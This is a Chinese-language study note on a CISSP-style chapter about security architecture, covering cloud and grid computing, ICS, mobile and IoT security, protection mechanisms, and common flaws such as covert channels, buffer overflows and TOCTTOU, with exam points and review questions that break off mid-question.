数据分析是对原始数据进行检查的科学，检查重点是从大量的信息中提取有用的信息。数据分析的结果可以集中于重要的异常值，或正常之外的例外或标准项，或所有数据项的总结，或一些集中的提取和有兴趣信息的组织。随着数据量的增加，数据分析的复杂性也在增加。大数据分析要求在大规模并行或分布式处理系统中进行高性能的分析。在安全方面，众多组织正在努力访问数据并收集范围更广、更为详尽的事件数据。这一数据收集的目标是评估合规性、提高效率、提高生产力、检测违规行为。</p><h4 id="9-4-5-大规模并行数据系统"><a href="#9-4-5-大规模并行数据系统" class="headerlink" title="9.4.5 大规模并行数据系统"></a>9.4.5 大规模并行数据系统</h4><p>　　并行数据系统或并行计算是一个计算系统，被设计用于同时进行大量的计算，但并行数据系统往往远远超出了基本的多处理能力。它们通常包括将一个大的任务划分成更小元素的概念，然后将每个子元素分发到不同的子处理系统进行井行计算。大规模并行数据管理在管理大数据上可能是一个关键的工具，井往往涉及云计算、网格计算、对等计算解决方案。</p><h3 id="9-5-分布式系统"><a href="#9-5-分布式系统" class="headerlink" title="9.5 分布式系统"></a>9.5 分布式系统</h3><p>　　在完整的主机/终端系统中，分布式体系结构容易出现意想不到的脆弱性。台式机系统可能包含存在泄露风险的敏感信息，因此必须加以保护。单独的用户可能缺乏一般的安全意识，因此内在的体系结构必须弥补这些不足。通信设备也会提供不期望的分布式环境入口点。分布式系统环境要求采取许多防护措施来实现适当的安全性，并确保消除、缓解或补救这些脆弱性。客户端必须受到对其内容及用户内容实施防护措施的策略的约束。</p><h4 id="9-5-1-云计算"><a href="#9-5-1-云计算" class="headerlink" title="9.5.1 云计算"></a>9.5.1 云计算</h4><p>　　云计算是虚拟化、互联网、分布式结构以及可随处访问数据和资源的自然延伸和演变。但是，云计算也存在一些问题，包括隐私问题、合规性困难、使用开/闭源解决方案、采用开放标准以及基于云计算的数据是否实际上是安全的(或甚至是可保护的)。这里列出一些云计算的概念：</p><ul><li><strong>平台即服务</strong> 平台即服务(PaaS)的概念是提供计算平台和软件解决方案作为虚拟的或基于云的服务。从本质上讲，这种类型的云计算解决方案提供了一个平台的所有方面(即操作系统和完整的解决方案)。PaaS的主要吸引力是避免了在本地购买和维护高端的硬件和软件。</li><li><strong>软件即服务</strong> 软件即服务(SaaS)是PaaS的衍生物。SaaS提供对特定软件应用或套件的按需在线访问而不需要本地安装。在许多情况下，只有很少的本地硬件和操作系统的局限性。SaaS可以实现订阅服务、付费服务或免费服务。</li><li><strong>基础设施即服务</strong> 基础设施即服务(IaaS)将PaaS模式带到了另一个方向，不但提供了按需操作的解决方案，还提供了完全外包的选择。这可以包括实用或定量的计算服务、管理任务自动化、动态规模、虚拟化服务、政策执行、管理服务和托管的/过滤的互联网连接。最终，IaaS允许企业通过云系统快速扩展新的软件或基于数据的服务/解决方案，而不必在本地安装大量的硬件。</li></ul><h4 id="9-5-2-网格计算"><a href="#9-5-2-网格计算" class="headerlink" title="9.5.2 网格计算"></a>9.5.2 网格计算</h4><p>　　网格计算是并行分布处理的一种形式，这种形式松散地把大量的处理节点组合在一起，为实现某个处理目标而工作。网格成员可以在随时的间隙时间进入和离开网格。通常，网格成员只有当它们的处理能力没有本地工作负担的情况下才会加入网格。当系统处于空闲状态时，它可以加入一个网格组，下载一小部分的工作，然后开始计算。当系统离开网格时，它保存任务并可上传己完成或部分的工作成果给网格。<br>　　网格计算关心的最大安全问题是每个工作包的内容潜在的完全暴露。许多网格计算项目是完全开放的，所以没有任何限制，谁都可以在本地运行和处理应用程序，并参与网格的项目。这就意味着，网格成员可以保存每个工作包的副本并检查内容。因此，网格项目将不能保持保密性，以及也不适用于隐私、机密或专有数据。<br>　　网格计算每时每刻的计算能力都可能发生巨大变化。工作包有时回不来、回来晚或有损坏地返回。这将需要大量的返工，井导致工程在速度、进程、响应上的不稳定性，以及整个项目和每个网格成员的延时。对时间敏感的项目可能因为没有足够的计算时间而不能在指定时间期限内完成任务。<br>　　网格计算经常用一台中央核心服务器来管理项目、跟踪工作数据包井整合返回的工作分组。如果中央服务器过载或离线，会发生网格的彻底失败或崩溃。然而，通常当中央网格系统不可访问时，网格成员也可完成它们目前的本地任务，然后定期轮询去发现什么时候中央服务器重新联机。还有一个潜在的风险，就是一台被恶意控制的中央网格服务器可能被利用来攻击网格成员，或欺骗网格成员去执行非网格社区所期望的恶意行为。</p><h4 id="9-5-3-点对点"><a href="#9-5-3-点对点" class="headerlink" title="9.5.3 点对点"></a>9.5.3 点对点</h4><p>　　点对点(Peer-To-Peer，P2P)技术是网络和分布式应用手里字的解决方案，用于在点对点实体间共享任务和工作负载。这类似于网格计算，与网格计算的主要区别是： 点对点没有中央管理系统，并且所提供的服务通常是实时的，而不是作为计算能力的集合。</p><h3 id="9-6-工业控制系统"><a href="#9-6-工业控制系统" class="headerlink" title="9.6 工业控制系统"></a>9.6 工业控制系统</h3><p>　　工业控制系统(ICS)是一种用于控制工业生产过程和机器的计算机管理设备。有几种ICS种类，包括集散控制系统(DCS)、可编程逻辑控制器(PLC)和数据采集与监控系统(SCADA)。DCS单元负责从单个地点的大型网络环境中收集数据和实施控制。DCS系统的一个重要方面是控制分布在所监测环境中的元件。PLC是有效的单用途或专门用途的数字计算机。它们通常被部署用于各种工业机电自动化管理与操作，如装配线或大规模的数字灯光显示控制系统。SCADA系统可以作为独立的设备使用，也可与其他SCADA系统组成网络或是与传统IT系统组成网络。</p><h3 id="9-7-评估和缓解基于Web系统的脆弱性"><a href="#9-7-评估和缓解基于Web系统的脆弱性" class="headerlink" title="9.7 评估和缓解基于Web系统的脆弱性"></a>9.7 评估和缓解基于Web系统的脆弱性</h3><p>　　在基于Web 的系统中有各种各样的应用和系统脆弱性与威胁，并且范围在不断扩大。脆弱性包括涉及XML和SAML，以及许多在开放式Web 应用程序安全项目(OWASP)中讨论的其他问题。<br>　　XML利用是一种编程攻击，用来伪造信息并将其发送给访客或导致他们的信息系统在未授权的情况下丢弃信息。对刀在L攻击日益关注的一个领域是安全断言标记语言(SAML)。SAML的滥用往往集中于网络认证。SAML是一种在安全域之间基于XML的组织会话，用于交换通信、认证和授权的细节，通常运行于Web协议之上。SAML通常用来提供基于Web的SSO(Single Sign-On)解决方案。如果攻击者可以伪造SAML通信或窃取访问者的访问令牌，他们就可以绕过认证并获得对网站的未授权访问。<br>　　OWASP是一个非营利性的安全项目，其重点在于提高在线或基于Web的应用程序的安全性。OWASP不仅仅是一个组织，也是一个大型社区，可以一起自由地分享信息、方法、工具、更好的编码实践及更安全的架构部署等相关技术。</p><h3 id="9-8-评估和缓解移动系统的脆弱性"><a href="#9-8-评估和缓解移动系统的脆弱性" class="headerlink" title="9.8 评估和缓解移动系统的脆弱性"></a>9.8 评估和缓解移动系统的脆弱性</h3><p>　　恶意内部人员可以通过外部不同类型的存储设备把恶意代码带入内部，这些设备包括手机、音频播放器、数码相机、存储卡、光盘和USB 设备。这些存储设备还可以用来泄漏或窃取内部机密和私人数据，以至于泄露到外部恶意的内部人员可以执行恶意代码、访问危险的网站或故意执行有害活动。</p><h4 id="9-8-1-设备安全"><a href="#9-8-1-设备安全" class="headerlink" title="9.8.1 设备安全"></a>9.8.1 设备安全</h4><p>　　设备安全可以在一定范围内为移动设备提供潜在的安全选项或功能。不是所有的便携式电子设备σED)都有很好的安全特性。但是，即使设备具有安全功能，但除非它们能被启用和正确配置，否则也是没有价值的。在做出购买决定之前，一定要考虑新设备的安全选项。</p><ul><li>全设备加密</li><li>远程擦除</li><li>锁定</li><li>锁屏</li><li>GPS</li><li>应用控制</li><li>存储分隔</li><li>资产跟踪</li><li>库存控制</li><li>移动设备管理</li><li>设备访问控制</li><li>可移动存储</li><li>关闭不使用的功能</li></ul><h4 id="9-8-2-应用安全"><a href="#9-8-2-应用安全" class="headerlink" title="9.8.2 应用安全"></a>9.8.2 应用安全</h4><ul><li>密钥管理</li><li>凭证管理</li><li>认证</li><li>地理标记</li><li>加密</li><li>应用自名单</li></ul><h4 id="9-8-3-BYOD关注点"><a href="#9-8-3-BYOD关注点" class="headerlink" title="9.8.3 BYOD关注点"></a>9.8.3 BYOD关注点</h4><p>　　BYOD是一项策略，允许员工在工作中携带自己的个人移动设备并使用这些设备连接(或通过)公司网络业务资源和/或互联网。虽然BYOD可以提高员工的士气和工作满意度，但却增加了组织的安全风险。用户需要了解在工作中使用他们自己的设备的好处、限制和后果。阅读并签署BYOD策略，参加回顾和培训计划以具备充足、合理的意识。</p><ul><li>数据所有权</li><li>所有权支持</li><li>补丁管理</li><li>反病毒管理</li><li>取证</li><li>隐私</li><li>在线/不在线</li><li>遵守公司策略</li><li>用户接受</li><li>架构/基础设施考虑</li><li>法律问题</li><li>可接受策略</li><li>机载摄像头/视频</li></ul><h3 id="9-9-评估和缓解嵌入式设备和物联网系统的脆弱性"><a href="#9-9-评估和缓解嵌入式设备和物联网系统的脆弱性" class="headerlink" title="9.9 评估和缓解嵌入式设备和物联网系统的脆弱性"></a>9.9 评估和缓解嵌入式设备和物联网系统的脆弱性</h3><p>　　嵌入式系统通常围绕与更大的产品相关的一系列有限和特定的功能而进行设计，井成为它的一个组成部分。关于嵌入式系统的另一个类似的概念是静态系统(又名静态环境)。静态环境是一组不改变条件、事件和周边的环境。静态的IT环境可以是任何系统，其用户和管理员的目的是保持环境不变。整个目标是防止或最大程度减少用户可能导致降低安全性或操作功能性的实施变更。在技术上，静态环境是应用手到芋、操作系统、硬件设置或网络被配置为满足特定的需要、能力或功能，然后保持设置不变。然而，尽管使用了”静态”这个术语，但没有真正的静态系统。因为总是存在改变环境的情况，如硬件故障、硬件配置变更、软件缺陷、软件设置的变更或漏洞，最终导致不希望的操作参数和实际上的安全入侵。</p><h4 id="9-9-1-嵌入式系统和静态系统的示例"><a href="#9-9-1-嵌入式系统和静态系统的示例" class="headerlink" title="9.9.1 嵌入式系统和静态系统的示例"></a>9.9.1 嵌入式系统和静态系统的示例</h4><p>　　支持网络功能的设备是那些本身有网络功能的便携或非便携设备。<br>　　网络物理系统指的是提供一种计算手段来控制物理世界中某样东西的设备。<br>　　网络物理系统、嵌入式系统和具备网络功能的设备的一种新扩展是物联网(loT)。物联网是设备的集合，可以通过互联网与其他设备或通过控制台来影响和监视真实世界。</p><h4 id="9-9-2-安全方法"><a href="#9-9-2-安全方法" class="headerlink" title="9.9.2 安全方法"></a>9.9.2 安全方法</h4><p>　　嵌入式系统和静态系统的安全问题包括以下事实： 大多数集中在如何最大限度地降低成本和无关的功能上。这往往会导致缺乏安全性且难于升级或安装补丁。由于嵌入式系统在真实世界中是一种控制机制，因此一个安全漏洞可能会造成对人和财产的损害。静态环境、嵌入式系统和其他有限或单一用途的计算环境需要安全管理。虽然它们可能没有广泛的攻击面，并且没有暴露过多的风险，但作为通用的计算机，它们仍然需要适当的安全治理。</p><ul><li>网络隔离</li><li>安全层</li><li>应用防火墙</li><li>手动升级</li><li>固件版本控制</li><li>包装</li><li>控制冗余和多样性</li></ul><h3 id="9-10-基本安全保护机制"><a href="#9-10-基本安全保护机制" class="headerlink" title="9.10 基本安全保护机制"></a>9.10 基本安全保护机制</h3><h4 id="9-10-1-技术机制"><a href="#9-10-1-技术机制" class="headerlink" title="9.10.1 技术机制"></a>9.10.1 技术机制</h4><h5 id="1-分层法"><a href="#1-分层法" class="headerlink" title="1. 分层法"></a>1. 分层法</h5><p>　　通过分层法处理，可以实现与用于操作模式的环模型(本章前面讨论过)类似的结构，并且能够应用于每一个操作系统进程。分层法将进程最敏感的功能放在中心，并且用逐渐扩大的同心圆代表敏感度较低的功能(使用稍有不同的方式，有时也采用术语” 较高层” 和”较低层” 进行阐述，从较低层进入较高层时，安全性与特权会被减弱或减少)。层与层之间的通信只能使用定义良好的特定接口，以便提供必要的安全性。来自外部(低敏感度)层的所有入站请求都必须经过严格的身份认证和授权检查，然后才能被允许继续进行(或者在未通过检查的情况下被拒绝)。为安全性使用的分层法类似于使用安全域和格子型安全模型，安全性以及对特定主体和客体的访问控制与指定的层和特权相关联，并且从外部层移至内部层时访问特权会增加。事实上，不同的层只能通过特定的接口进行通信，这种接口被设计用于维护系统的安全性和完整性。即使低安全性的外部层依赖于来自更高安全性的内部层的服务和数据，它们也仍然只知道如何与这些内部层接口，但是对内部层的内部结构、特征或其他细节毫无了解。为了维护层的完整性，内部层既不了解也不依赖于外部层。无论任何一对层之间存在何种安全关系，都不会对对方造成影响(因此每个层都不会遭受其他层的篡改)。最后，外部层不能违反或重写内部层强制实施的任何安全策略。</p><h5 id="2-抽象"><a href="#2-抽象" class="headerlink" title="2. 抽象"></a>2. 抽象</h5><p>　　抽象是支持面向对象编程的领域的基本原则之一。对象(或操作系统组件)的用户没有必要知道对象的工作细节，而是只需知道使用对象的正确语法和作为结果返回的数据的类型(也就是如何发送输入和接收输出)。这往往涉及对数据或服务的中间访问，就像用户模式中的应用程序使用系统调用请求管理员模式中的服务或数据一样(根据请求者的凭证和特权授予或拒绝这种请求) ，而不是获得直接的、非中间的访问。抽象的另一种安全应用方式引入了对象组(有时也被称为类)，此时访问控制和操作权限被分配给对象组，而不是在每个对象的基础上进行分配。这种方式允许安全管理员方便地定义和命名对象组(通常与作业角色或职责有关)，并且使权限和特权管理变得更为容易(当把对象加入某个类时，就能赋予权限和特权，从而不必单独针对每个对象管理权限和特权) 。</p><h5 id="3-数据隐藏"><a href="#3-数据隐藏" class="headerlink" title="3. 数据隐藏"></a>3. 数据隐藏</h5><p>　　数据隐藏是多级安全系统的一个重要特征，它能够确保存在于某个安全级别的数据对于运行在不同安全级别的进程来说是不可见的。数据隐藏背后的重要概念是： 保证不必知道在某个级别访问和处理数据所涉及细节的人无法偷偷摸摸地或违法地了解和查看这些细节。从安全性的角度看，数据隐藏依赖于将客体置入不同于主体所占用容器的其他安全容器中，从而对不必对客体细节进行了解的人隐藏相关的细节。</p><h5 id="4-进程隔离"><a href="#4-进程隔离" class="headerlink" title="4. 进程隔离"></a>4. 进程隔离</h5><p>　　进程隔离要求操作系统为每个进程的指令和数据提供不同的内存空间。此外，还要求操作系统强制实施这些分界，以阻止某一进程读取或写入属于另一个进程的数据。使用进程隔离技术主要有下列两个优点：</p><ul><li>阻止未经授权的数据访问。进程隔离是多级安全模式系统的基本要求之一。</li><li>保护进程的完整性。如果没有这样的控制措施，那么设计糟糕的进程可能会出现错误，并且将数据写入分配给其他进程的内存空间，从而导致整个系统不稳定，而不仅仅是影响错误进程的执行。在更恶意的情况下，进程可能试图(甚至可能成功)读取或写入超出其处理范围的内存空间、入侵或攻击其他进程。</li></ul><h5 id="5-硬件分隔"><a href="#5-硬件分隔" class="headerlink" title="5. 硬件分隔"></a>5. 硬件分隔</h5><p>　　硬件分隔的目的与进程隔离类似： 用于阻止对属于不同进程/安全级别的信息的访问。二者的主要差异是：硬件隔离通过使用物理方式的硬件控制措施来强制实施这些要求，而不是通过操作系统强加的逻辑进程隔离控制方法。</p><h4 id="9-10-2-安全策略与计算机体系结构"><a href="#9-10-2-安全策略与计算机体系结构" class="headerlink" title="9.10.2 安全策略与计算机体系结构"></a>9.10.2 安全策略与计算机体系结构</h4><p>　　安全策略的角色是告知和指导某些特殊系统的设计、开发、实现、测试和维护。因此，这种安全策略主要关注于单一的实现努力(尽管可能改编自其他类似的实现努力，但是应当尽可能准确和完整地反映目标)。对于系统开发人员而言，安全策略最好通过文档形式定义一组规则、实践和措施，它们描述了系统应当如何管理、保护和分布敏感的信息。阻止信息从较高安全级别流向较低安全级别的安全策略被称为多级安全策略。随着系统开发的进行，应当针对所有适用的系统组件或元素(包括以下全部或其中的一部分： 物理的硬件组件、固件、软件以及组织如何交互和使用系统)设计、构建、实现和测试安全策略。总之，安全考虑应该贯穿项目的整个生命周期，而不是到最后才考虑，否则更容易遭受失败。</p><h4 id="9-10-3-策略机制"><a href="#9-10-3-策略机制" class="headerlink" title="9.10.3 策略机制"></a>9.10.3 策略机制</h4><ul><li>最小特权原则</li><li>特权分离</li><li>可问责性</li></ul><h3 id="9-11-常见的缺陷和安全问题"><a href="#9-11-常见的缺陷和安全问题" class="headerlink" title="9.11 常见的缺陷和安全问题"></a>9.11 常见的缺陷和安全问题</h3><h4 id="9-11-1-隐蔽通道"><a href="#9-11-1-隐蔽通道" class="headerlink" title="9.11.1 隐蔽通道"></a>9.11.1 隐蔽通道</h4><p>　　隐蔽通道是用于传递信息的方法，通常不用于通信。因为隐蔽通道的路径通常不用于通信，所以不会受到系统正常安全控制方法的保护。使用隐蔽通道提供了违反、绕过或回避安全策略而不被发现的一种方法。目前存在下列两种基本的隐蔽通道类型：</p><ul><li><strong>时间隐蔽通</strong> 道通过以一种可预测的方式改变系统组件的性能或更改资源的时间安排来传达信息。使用时间隐蔽通道通常是一种比较复杂的传送数据的方法，并且难以检测。</li><li><strong>存储隐蔽通</strong> 道通过将数据写入其他进程可以读到的公共存储区域来传达信息。当评估软件安全时，需要注重评估任意进程将信息写入内存中任意位置时，是否可能被其他的进程读取。</li></ul><p>　　这两种隐蔽通道都是依靠使用通信技术与其他未经授权的主体交换信息。因为隐蔽通道的性质是与众不同的，并且位于正常的数据传送环境之外，所以对其进行检测十分困难。针对任何隐蔽通道活动的最佳防护措施是实现审计和分析日志文件。</p><h4 id="9-11-2-基于设计或编码缺陷的攻击和安全问题"><a href="#9-11-2-基于设计或编码缺陷的攻击和安全问题" class="headerlink" title="9.11.2 基于设计或编码缺陷的攻击和安全问题"></a>9.11.2 基于设计或编码缺陷的攻击和安全问题</h4><ul><li><p>初始化和失败状态<br>在毫无准备的情况下，系统突然崩愤，接着又重新恢复，这个过程就可能存在两个会危及系统安全控制的机会。许多系统在关机过程中会卸载安全控制。可信恢复能够保证在发生系统崩横时，所有的控制措施都完整无缺。在可信恢复的过程中，系统能确保在安全控制失效的情况下不发生任何访问活动。甚至在系统恢复阶段，所有控制方法都还在完整地运行着。虽然自动恢复过程构成了整个恢复过程的一部分，但是人为的干预仍然是必要的。很显然，如果需要这样的人工操作，那么对执行恢复操作的人员进行适当的身份标识和身份认证同样也是必不可少的。</p></li><li><p>输入和参数检查<br>缓冲区溢出是一种声名狼蒲的安全破坏行为。在编程人员未能充分验证输入数据时，尤其是在没有对软件接受为输入的数据量进行限制时，就会出现缓冲区溢出。验证数据的有效性是消除缓冲区滋出的唯一方法。一旦发现缓冲区溢出，受影响的系统就必须以常见的方式应用关键的安全更新，从而避免遭受攻击。</p></li><li><p>维护钩子和特权程序<br>维护钩子程序是只有系统开发人员才知道的系统入口点，这些入口点也被称为后门。后门的最初目的是： 出于维护系统的原因或者在正常的访问由于疏忽导致失效时，能够提供有保证的访问。后门存在的问题是： 这种访问类型避开了所有的安全控制措施，并且为所有知道后门存在的人提供了不受限制的访问。必须明确禁止这些入口点，并且通过监控审计日志来发现那些表明可能是未经授权的管理员访问行为。另一种常见的系统脆弱性是幸自字在执行过程中安全级别被提高的情况。这些程序必须被认真编写和测试，从而不会允许任何出口点和/或入口点存在，以防提高主体的安全级别。确保所有运行在较高安全级别的程序都只能被适当的用户访问，并且这些用户会坚决抵制滥用。</p></li><li><p>增量攻击<br>某些攻击形式以缓慢的、渐进的增量方式发生，而不是通过明显的或可识别的活动来危害系统的安全性或完整性。当攻击者获得访问系统的权限并且在存储、处理、输入、输出或事务处理期间对数据进行细小的、随机的或增量的改变时(而不是明显地改变文件内容或破坏、删除整个文件)，就会发生数据欺骗。如果没有通过执行加密或某种完整性检查(例如，校验和或消息摘要)并在每次文件读写时都加以应用来保护文件和数据，那么就很难检测这些变化。加密的文件系统、文件级别的加密技术或某些文件监控形式(包括诸如Tripwire 之类的应用程序所执行的完整性检查)通常足以保证不会发生数据欺骗。数据欺骗通常被认为是一种大多由内部人员、很少由外部人员(也就是外部入侵者)进行的攻击。很显然，因为数据欺骗是一种修改数据的攻击，所以我们将其视为主动攻击。</p></li></ul><h4 id="9-11-3-编程"><a href="#9-11-3-编程" class="headerlink" title="9.11.3 编程"></a>9.11.3 编程</h4><p>　　任何不能妥善处理异常的程序都处于不稳定状态的危险之中。程序为了执行正常的任务而提升了自己的安全级别以后，就很有可能导致崩溃。如果攻击者在适当时成功地使程序崩溃，那么他们就能达到较高的安全级别并造成对系统机密性、完整性和可用性的损害。无论是直接执行还是间接执行，所有的程序都必须经过完整的测试以遵从安全模型。确认你所安装的任何软件使用的都是最新版本，并且知道任何己知的安全脆弱性。因为每种安全模型和每种安全策略都是不同的，所以必须确保执行的软件不会超出准许的授权。编写安全代码是很困难的，不过确实是可能的。确保使用的所有程序在设计时都考虑了安全性问题。</p><h4 id="9-11-4-计时、状态改变和通信中断"><a href="#9-11-4-计时、状态改变和通信中断" class="headerlink" title="9.11.4 计时、状态改变和通信中断"></a>9.11.4 计时、状态改变和通信中断</h4><p>　　计算机系统执行任务时具有严格的精确度。计算机的优越性在于可重复执行任务。攻击者可以根据任务执行的可预测性来开发攻击程序。常见的算法的事件顺序是先检查可用资源，然后在被准许的情况下进行访问。检查时间(Time Of Check，TOC)是指主体检查客体状态的时间。在返回要访问的客体之前，系统可以做出几种决定。当做出可以访问客体的决定时，程序在使用时间(Time Of Use，TOU)访问客体。在TOC与TOU之间存在的时间差对于攻击者来说是充足的，攻击者能够在这段时间内用另一个符合自己需要的客体来替换原先的客体。检查时间到使用时间(Time-Of-Check-To-Time-Of-Use，TOCTTOU)攻击通常被称为竞争条件，这是由于攻击者与合法的进程进行竞争，从而希望在客体被使用之前对其进行替换。<br>　　同样，当资源的状态或整个系统发生改变时，攻击者可以试图在两种己知的状态之间采取行动。通信中断也为攻击者提供了一段可以利用的短暂时间。在资源的状态检查出现在对资源采取行动之前的任何时候，都存在发起潜在攻击的机会窗口。这些攻击必须在安全策略和安全模型中加以解决。TOCTTOU攻击、竞争条件漏洞利用及沟通障碍被称为状态攻击，因为它们攻击一个系统状态过波到另一个状态之间的时差、数据流控制和数据传输。</p><h4 id="9-11-5-技术和过程完整性"><a href="#9-11-5-技术和过程完整性" class="headerlink" title="9.11.5 技术和过程完整性"></a>9.11.5 技术和过程完整性</h4><p>　　评估和理解系统架构中的漏洞是很重要的，特别是关于技术和流程的整合方面。由于多种的技术和复杂的过程在规划新的和定制的业务功能时相互交叉，新的问题和安全问题就会显现出来。随着系统的集成，注意力应该放在潜在的单点故障方面，以及面向服务架构(Service-Oriented Architecture，SOA)的紧迫弱点上。SOA构造了新应用或目前没有的功能，而且独立且区别于软件服务。由于应用结果通常是新的; 因此安全问题也是未知的、未经检验的和无保户的。所有新的部署，特别新的应用或函数，需要彻底被审查之后，它们才能被允许进入和运行于生产网络或发布到互联网上。</p><h4 id="9-11-6-电磁辐射"><a href="#9-11-6-电磁辐射" class="headerlink" title="9.11.6 电磁辐射"></a>9.11.6 电磁辐射</h4><p>　　因为计算机硬件是由各种电子元件构造而成的，所以许多计算机硬件设备在正常运转的过程中都会放射出电磁辐射(Emit Electromagnetic，EM)。与其他计算机或外围设备进行通信的过程也会产生可能会被拦截的电磁波。通过拦截和处理来自键盘和计算机显示器的电磁辐射，我们甚至有可能重新生成键盘输入或显示器输出的数据。我们也可以被动地(也就是没有真的窃听电缆)检测和读取在网段上经过的网络数据包。这些辐射泄漏可能会引起严重的安全问题，但是通常比较容易解决。消除电磁辐射拦截的最容易方法是，通过电缆屏蔽或放入导管来降低辐射，以及通过物理安全控制方法阻止未授权人员和设备过于靠近设备或电缆。通过降低信号强度和在敏感设备周围增加物理缓冲区，就能够大幅度地减少信号辐射被拦截的风险。</p><h3 id="9-12-考试要点"><a href="#9-12-考试要点" class="headerlink" title="9.12 考试要点"></a>9.12 考试要点</h3><ul><li><strong>能够解释多任务处理、多线程剑主里、多处理器和多程序设计之间的差异</strong> 多任务处理是在一台计算机上同时执行多个应用程序，并由操作系统管理。多线程处理允许在一个进程内执行多个并发任务。多处理器是使用多个处理器以提高计算能力。多F到芋设计与多任务处理类似，但是在大型机系统上使用并且需要特殊的程序设计。</li><li><strong>理解单一状态处理器和多态处理器之间的差异</strong> 单一状态处理器能够一次只在一个安全级别运行，而多态处理器可以同时在多个安全级别运行。</li><li><strong>描述由美国联邦政府认可的用于处理分类信息的4种安全模式</strong> 专用系统要求所有用户对在系统中存储的所有信息都具有适当的许可级别、访问特权和”知其所需”要求。系统高级模式则去除了”知其所需” 要求。分隔模式去除了”知其所需”要求和访问特权要求。多级模式则去除了上述所有三个要求。</li><li><strong>解释大多数现代处理器使用的两种分层操作模式</strong> 用户应用程序在有限的指令集环境中运行，这被称为用户模式。操作系统在特权模式下执行受控的操作，这种模式也被称为系统模式、内核模式和监管模式。</li><li><strong>描述计算机使用的不同存储器类型</strong> ROM是非易失性的，并且终端用户无法写入数据。PROM芯片仅允许终端用户写入一次数据。通过紫外线光照射可以擦除EPROM芯片中的数据，然后再重新写入数据。可以用电流擦除EEPROM芯片中的数据，然后再重新写入数据。RAM芯片是易失性的，当计算机的电源被切断后，芯片中的内容会丢失。</li><li><strong>了解有关存储器组件的安全问题</strong> 目前有三种主要的安全问题与存储器组件有关： 电源切断后，数据仍有可能保留在芯片上：存储器芯片容易被盗; 在多用户系统中控制对存储器的访问。</li><li><strong>描述计算机使用的存储设备的不同特征</strong> 主存储设备与存储器相同。辅助存储设备有磁性和光学介质两种，在CPU能够使用这些数据之前，先要将数据读入主存储器。随机存取存储设备可以在任何位置读取数据，然而顺序存取存储设备需要扫描物理存储的所有数据后才能到达指定的位置。</li><li><strong>了解有关辅助存储设备的安全问题</strong> 目前有三个与辅助存储设备有关的安全问题： 可移动介质能够被用于窃取数据;必须应用访问控制和加密技术来保护数据;即使在删除文件或格式化介质后，数据也仍可能保留在介质上。</li><li><strong>理解输入和输出设备会带来的安全风险</strong> 输入输出设备会遭到偷听和窃听(能够将数据偷带出组织，还能够创建可以进入组织系统和网络的未授权、不安全的入口点)。一定要能够识别和缓解这些脆弱性。</li><li><strong>理解I/O地址、配置和设置</strong> 操作传统PC设备要求对IRQ、DMA和存储映射I/O有一定了解。要准备好识别和处理潜在的地址冲突和错误配置，井且能够集成传统设备与即插即用(PnP)组件。</li><li><strong>理解使用固件的目的</strong> 固件是被存储到ROM芯片上的软件。在计算机层次上，固件包含了启动计算机所需的基本指令。固件还被用于在外围设备(如打印机)中提供操作指令。</li><li><strong>能够描述进程隔离、分层法、抽象、数据隐藏和硬件分隅</strong> 进程隔离能够确保进程只能访问它们自己的数据。分层法在一个进程内创建不同的安全域并限制彼此之间的通信。抽象能够在不要求了解算法或设备内部工作原理的情况下生成”黑箱”接口。数据隐藏阻止信息被来自不同安全级别的进程读取。硬件分隔使用物理控制措施实现进程的隔离。</li><li><strong>理解安全策略如何帮助完成系统的设计、实现、测试和部署</strong> 安全策略的作用是通知和指导某些特定系统的设计、开发、实现、测试和维护。</li><li><strong>理解云计算</strong> 云计算是一个流行的术语，指的是一个计算的概念，即处理和存储是通过网络连接到其他地方运行而不是在本地运行。云计算通常被认为是基于互联网的计算。</li><li><strong>理解移动设备的安全</strong> 设备安全涉及为移动设备提供可以利用的潜在安全选择或功能范围。不是所有的便携式电子设备(PED)都有好的安全特性。PED安全功能包括整个设备的加密、远程擦除、锁定、锁屏、GPS、应用控制、存储分隔、资产跟踪、目录控制、移动设备管理、设备访问控制、移动存储和禁用未使用的功能。</li><li><strong>理解移动设备应用安全</strong> 在移动设备上使用的应用程序和功能需要被保护。相关概念包括密钥管理、证书管理、身份认证、地理标记、加密、应用自名单和可传递的信任/认证。</li><li><strong>理解BYOD</strong> 自带设备(BYOD)是一项策略，允许员工携带自己的个人移动设备进行工作，然后使用这些设备来连接(或穿过)公司网络的业务资源和/或互联网。虽然BYOD可以提高员工士气和工作满意度，但却增加了组织的安全风险。相关问题包括数据所有权、所有权支持、补丁管理、防病毒管理、取证、隐私、登录/关闭登录、企业策略的一致性、用户接受、架构/基础设施的考虑、法律问题、可接受的使用策略以及机载摄像机/视频。</li><li><strong>理解嵌入式系统和静态环境</strong> 嵌入式系统通常相对于较大的产品来说只是其中一个组件，通常被设计围绕着一组有限的特定功能。静态环境是应用程序、操作系统、硬件集合或为了特殊需求、能力或功能而配置的网络，然后设置为保持不变。</li><li><strong>理解嵌入式系统和静态环境下的安全问题</strong> 静态环境、嵌入式系统和其他有限或单一用途的计算环境需要安全管理。这些技术包括网络分隔、安全层、应用防火墙、手动更新、固件版本控制、包装、控制冗余和多样性。</li><li><strong>理解如何在计算机体系结构中应用最小特权、特权分离和可问责性</strong> 最小特权原则确保只有少量进程被授权在监管模式下运行。特权分离增加了安全操作的粒度。可问责性确保可以使用审计跟踪追溯到操作源。</li><li><strong>能够解释什么是隐蔽通道</strong> 隐蔽通道是用于传送信息的任何方法，但是通常不用于信息通信。</li><li><strong>理解什么是缓冲区溢出和输入检查</strong> 当编程人员在将数据写入特定内存地址之前没有检查输入数据的大小时，就可能会发生缓冲区溢出。事实上，对输入数据有效性的任何验证失败都会导致安全性受到破坏。</li><li><strong>描述安全体系结构的常见缺陷</strong> 除了缓冲区溢出以外，编程人员在部署系统后还会留下后门和特权程序。即使设计良好的系统也可能遭到TOCTTOU 攻击。任何状态改变都为攻击者提供了危及系统安全的潜在机会。</li></ul><h3 id="9-14-复习题"><a href="#9-14-复习题" class="headerlink" title="9.14 复习题"></a>9.14 复习题</h3><ol><li><p>许多PC 操作系统提供一个功能，这个功能使它们能够支持单处理器系统中的多个应用程序同时执行。什么术语用于描述这种能力?<br>A. 多程序<br>B. 多线程<br>C. 多任务<br>D. 多处理器</p></li><li><p>什么技术为组织提供对BYOD设备的最佳控制?<br>A. 应用自名单<br>B. 移动设备管理<br>C. 加密移动存储<br>D. 